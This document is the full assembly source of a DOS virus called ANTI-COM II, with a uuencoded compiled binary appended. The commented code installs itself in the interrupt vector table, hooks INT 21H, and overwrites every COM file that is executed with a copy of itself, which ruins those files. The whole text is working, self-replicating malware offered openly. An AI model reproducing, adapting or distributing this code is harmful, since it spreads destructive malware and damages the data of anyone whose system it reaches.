;The ANTI-COM II Virus
;
;This is a memory resident COM infector that hides in the interrupt vector
;table, starting at 0:200H. COM files are infected when executed.
;This is an overwriting virus that ruins any COM file it infects.
;

.model  tiny
.code

IVOFS   EQU     100H

        ORG     100H

;This code checks to see if the virus is already in memory. If so, it just
;returns to DOS. If not, it loads the virus in memory and then returns to DOS.
ANTICOM:
        call    IN_MEMORY                       ;is virus in memory?
        jnz     LOAD_VIRUS                      ;no, go load it now
        ret                                     ;yes, just return to DOS

LOAD_VIRUS:
        mov     di,IVOFS + 100H                 ;nope, put it in memory
        mov     si,100H
        mov     cx,OFFSET END_ANTICOM - 100H
        rep     movsb                           ;first move it there

        mov     bx,21H*4                        ;next setup int vector 21H
        xchg    ax,es:[bx+2]                    ;get/set segment
        mov     cx,ax
        mov     ax,OFFSET INT_21 + IVOFS
        xchg    ax,es:[bx]                      ;get/set offset
        mov     di,OFFSET OLD_21 + IVOFS        ;and save old seg/offset
        stosw
        mov     ax,cx
        stosw                                   ;ok, that's it, virus is resident
        ret                                     ;so return to DOS

;This routine checks to see if ANTICOM is already in memory by comparing the
;first 10 bytes of int 21H handler with what's sitting in memory in the
;interrupt vector table.
IN_MEMORY:
        xor     ax,ax
        mov     es,ax
        mov     di,OFFSET INT_21 + IVOFS
        mov     si,100H
        mov     cx,10
        repz    cmpsb
        ret

;This is the interrupt 21H handler. It looks for any attempts to open a file,
;and when found, the virus swings into action. Note that this piece of code is
;always executed from the virus in the interrupt table. Thus, all data
;addressing must add IVOFS to the compiled values to work.
OLD_21  DD      ?
INT_21:
        cmp     ax,4B00H                        ;executing a file?
        jne     I21E                            ;nope, let DOS have it
        push    ds                              ;yes, make sure to save
        push    dx                              ;file name pointer
        pushf                                   ;and fake int 21H
        call    DWORD PTR cs:[OLD_21+IVOFS]     ;with a call
        pop     dx
        pop     ds                              ;restore these
        pushf                                   ;save flags
        call    FILE_EXEC                       ;infect the file
        popf
        iret                                    ;and return from interrupt

I21E:   jmp     DWORD PTR cs:[OLD_21+IVOFS]     ;no, just let DOS have this int

;Here we process requests to open files. This routine will open the file,
;and put the virus there.
FILE_EXEC:
        push    ax
        push    si
        push    dx
        push    ds

        mov     si,dx                           ;now see if a COM file
FO1:    lodsb
        or      al,al                           ;null terminator?
        jz      FEX                             ;yes, not a COM file
        cmp     al,'.'                          ;a period?
        jne     FO1                             ;no, get another byte
        lodsw                                   ;yes, check for COM extent
        or      ax,2020H
        cmp     ax,'oc'
        jne     FEX
        lodsb
        or      al,20H
        cmp     al,'m'
        jne     FEX                             ;exit if not COM file

        mov     ax,3D02H                        ;open file in read/write mode
        int     21H
        jc      FEX                             ;exit if error opening
        mov     bx,ax                           ;put handle in bx
        push    cs
        pop     ds
        mov     ah,40H                          ;and write virus to file
        mov     dx,IVOFS + 100H
        mov     cx,OFFSET END_ANTICOM - 100H
        int     21H
        mov     ah,3EH                          ;then close the file
        int     21H

FEX:    pop     ds
        pop     dx
        pop     si
        pop     ax
        ret

END_ANTICOM:                                     ;label for end of the virus

        END     ANTICOM
begin 775 anticom2.com
MZ"4`=0'#OP`"O@`!N9,`\Z2[A``FAT<"B\BX/`(FAP>_.`*KB\&KPS/`CL"_
M/`*^``&Y"@#SIL,`````/0!+=1`>4IPN_QXX`EH?G.@'`)W/+O\N.`)05E(>
MB_*L"L!T+3PN=?>M#2`@/6-O=2"L#"`\;749N`(]S2%R$HO8#A^T0+H``KF3
,`,TAM#[-(1]:7EC#
`
end
